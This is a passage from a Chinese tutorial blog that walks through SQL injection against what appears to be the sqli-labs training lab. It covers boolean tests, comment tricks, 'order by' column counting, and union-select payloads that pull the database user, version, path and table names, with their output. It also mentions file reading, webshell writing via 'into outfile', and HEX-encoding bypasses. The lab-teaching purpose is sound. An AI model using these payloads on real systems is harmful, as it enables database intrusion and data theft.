class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; users &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; 因为 &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; 为真&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; 也是真 &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; 两边均为真 所以页面会返回 id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; 的结果。 如果用户传入参数为 &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt; 时&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;因为 &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt; 为假 id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; 为真 &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; 两边有一个为假，所以页面返回与 id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; 不一样的结果。&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;由此可以初步判断存在 &lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt; 注入漏洞，攻击者可以进一步拼接  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;1&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;1&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;1&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;1&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;1&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;1&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;判断页面是否不一样，还有无回显的情况输入语句页面没有变化但实际上执行了这种还有延时注入给拼接语句时 sleep 5 看页面是不是 5 秒后显示的&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;sql&lt;/span&gt;注释符&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token comment&#34;&gt;# 单行注释 url 编码 %23&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;/*  */&lt;/span&gt; 多行注释 &lt;span class=&#34;token comment&#34;&gt;/**/&lt;/span&gt;当空格用&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;--&#34;空格&#34; 单行注释&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;--+ 也可以&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;是否存在注入判断注入的类型是什么&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;判断字段数 &lt;span class=&#34;token keyword&#34;&gt;order&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;by&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;确定回显点 &lt;span class=&#34;token keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;查询数据库信息 @&lt;span class=&#34;token variable&#34;&gt;@version&lt;/span&gt; @&lt;span class=&#34;token variable&#34;&gt;@datadir&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;查询用户名，数据库名 &lt;span class=&#34;token keyword&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;database&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;文件读取 &lt;span class=&#34;token keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;load_file&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;C:\\wondows\\win.ini&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;#&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;写入 webshell &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;into&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;outfile&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;补充一点，使用 &lt;span class=&#34;token keyword&#34;&gt;sql&lt;/span&gt; 注入遇到转义字符串的单引号或者双引号，可使用 HEX 编码绕过&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;注入类型&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#注入类型&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;kbd&#34;&gt;注入类型&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;SQL 注入分类：按 SQLMap 中的分类来看，SQL 注入类型有以下 5 种：&lt;/p&gt;
&lt;p&gt;UNION query SQL injection（可联合查询注入）&lt;/p&gt;
&lt;p&gt;Stacked queries SQL injection（可多语句查询注入）&lt;/p&gt;
&lt;p&gt;堆叠查询 Boolean-based blind SQL injection（布尔型注入）&lt;/p&gt;
&lt;p&gt;Error-based SQL injection（报错型注入）&lt;/p&gt;
&lt;p&gt;Time-based blind SQL injection（基于时间延迟注入）&lt;/p&gt;
&lt;h4 id=&#34;接受请求类型区分&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#接受请求类型区分&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;kbd&#34;&gt;接受请求类型区分&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;GET 注入&lt;/p&gt;
&lt;p&gt;GET 请求的参数是放在 URL 里的，GET 请求的 URL 传参有长度限制 中文需要 URL 编码&lt;/p&gt;
&lt;p&gt;POST 注入 POST 请求参数是放在请求 body 里的，长度没有限制&lt;/p&gt;
&lt;p&gt;COOKIE 注入 cookie 参数放在请求头信息，提交的时候 服务器会从请求头获取&lt;/p&gt;
&lt;h4 id=&#34;注入数据类型的区分&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#注入数据类型的区分&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;kbd&#34;&gt;注入数据类型的区分&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;int 整型 select * from users where id=1 sting&lt;/p&gt;
&lt;p&gt;字符型 select * from users where username=‘admin’ like&lt;/p&gt;
&lt;p&gt;搜索型 select * from news where title like ‘% 标题 %’&lt;/p&gt;
&lt;h3 id=&#34;union-select-联合注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#union-select-联合注入&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;kbd&#34;&gt;union select 联合注入&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;1, 判断 &lt;code&gt; http://www.sql.cn/Less-1/?id=1&#39; and 1=1 %23&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://www.sql.cn/Less-1/?id=1&#39; and 1=2 %23&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;报错存在注入&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero6.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;2, 查字段&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; order by 1 %23  --返回正常&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id=1&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;order&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;by&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;23&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;-- 返回正常&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; order by 3 %23  --返回正常&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id=1&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;order&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;by&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;23&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;-- 返回错误&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;三个字段&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero7.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;利用 union 联合查询收集信息&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; union select 1,2,3 %23&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;#看哪个字段可以显示信息，利用它获取数据库信息&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;获取数据库信息&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id=-1&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;concat_ws&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;database&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;version&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;@&lt;span class=&#34;token variable&#34;&gt;@datadir&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;@&lt;span class=&#34;token variable&#34;&gt;@version_compile_os&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;23&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;databaes&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#获取数据库用户名&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;version&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#获取数据库版本&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;@&lt;span class=&#34;token variable&#34;&gt;@datadir&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#获取数据库路径&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;@&lt;span class=&#34;token variable&#34;&gt;@version_conpile_os&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#获取操作系统版本&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Your Login name:&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&#39; &lt;span class=&#34;token keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;database&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;23&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;security &lt;span class=&#34;token comment&#34;&gt;#数据库名&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;（&lt;span class=&#34;token number&#34;&gt;5.7&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;.26&lt;/span&gt;） &lt;span class=&#34;token comment&#34;&gt;#数据库版本&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;（root&lt;span class=&#34;token variable&#34;&gt;@localhost&lt;/span&gt;） &lt;span class=&#34;token comment&#34;&gt;#数据库用户名&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;（D:\Everyday&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;tools\phpstudy_pro\Extensions\MySQL5&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;7.26&lt;/span&gt;\&lt;span class=&#34;token keyword&#34;&gt;data&lt;/span&gt;\root&lt;span class=&#34;token variable&#34;&gt;@localhost&lt;/span&gt;）&lt;span class=&#34;token comment&#34;&gt;#数据库路径&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Win64 &lt;span class=&#34;token comment&#34;&gt;#操作系统版本&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Your Password:&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero8.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; union select 1,2,table_name from information_schema.tables where table_schema=&#39;&lt;/span&gt;security&lt;span class=&#34;token string&#34;&gt;&#39; limit 0,1 %23&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;#查询单个 改变limit 0,1 前面的数即可查询其他表例如 limit 1,1 limit 2,1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;另一种查询全部&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id=-1&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;group_concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;table_name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; information_schema&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;tables&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; table_schema&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;database&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;23&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;group_concat &lt;span class=&#34;token comment&#34;&gt;#分组查询结果，隔开&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;emails&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;referers&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;uagents&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;users&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero9.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;4, 查列名&lt;/p&gt;
